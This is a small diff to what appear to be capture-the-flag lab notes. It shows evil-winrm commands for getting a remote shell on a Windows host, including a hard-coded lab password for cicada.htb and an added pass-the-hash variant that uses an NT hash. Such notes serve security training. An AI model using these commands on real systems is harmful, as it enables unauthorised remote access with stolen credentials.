@@ -50,4 +50,7 @@ Execution!
 ```
 # evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
 evil-winrm -u <user> -p '<password>' -i <domain>
+
+# Using NT hash
+evil-winrm -u <user> -H '<NT hash>' -i <domain>
 ```
